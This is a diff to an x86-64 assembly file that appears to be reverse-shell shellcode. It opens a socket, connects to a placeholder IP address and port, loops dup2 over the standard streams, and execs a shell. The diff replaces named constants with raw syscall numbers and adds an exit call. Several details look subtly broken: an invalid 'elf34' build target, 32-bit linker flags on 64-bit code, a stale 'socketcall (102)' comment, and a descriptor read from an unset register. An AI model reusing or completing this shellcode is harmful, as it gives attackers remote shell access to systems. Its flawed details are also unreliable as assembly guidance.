@@ -1,4 +1,4 @@
-; compile : nasm -f elf32 reverser_so_64.asm && ld -m elf_i386 reverser_so_64.o -o reverseshell
+; compile : nasm -f elf34 reverser_64_optimized.asm && ld -m elf_i386 reverser_64_optimized.o -o reverseshell
 global      _start
 
 section .text
@@ -19,10 +19,10 @@ section .text
 _start:
 ; We first need to create a socket
 ; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
-    mov         al, SOCKET      ; socketcall (102)
-    push        AF_INET
+    mov         al, 0x29        ; socketcall (102)
+    push        0x2
     pop         rdi
-    push        SOCK_STREAM
+    push        0x1
     pop         rsi
     xor         edx, edx
     syscall                     ; execute
@@ -31,28 +31,28 @@ _start:
 ; Then connect to ip and port
     xchg        rdi, rax
     xor         rcx, rcx
-    mov         ebx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
+    mov         ebx, -ip_address- ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
     xor         ebx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
     push        rcx
     push        rcx
     push        rbx
-    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
-    push        word AF_INET    ; AF_INET (2)
+    pushw       -port-       ; port = 8080 = 1F90; need to put it in reverse
+    pushw       0x2    ; AF_INET (2)
     mov         rsi, rsp
-    push        byte 0x10
+    pushw       0x10
     pop         rdx
 
     mov         rbx, rdi
-    mov         al, CONNECT
+    mov         al, 0x2a
     syscall             ; execute
 
 ; Get input and redirect output
-    push        byte 0x02
+    pushw       0x02
     pop         rsi
     mov         rdi, r9
 
 loop:
-    push        DUP
+    push        0x21
     pop         rax
     syscall
     dec         rsi
@@ -69,5 +69,10 @@ loop:
     push        rdi
     mov         rsi, rsp
     
-    mov         al, EXECVE
+    mov         al, 0x3b
+    syscall
+
+    xor         rbx, rbx
+    xor         rax, rax
+    mov         al, 0x1
     syscall
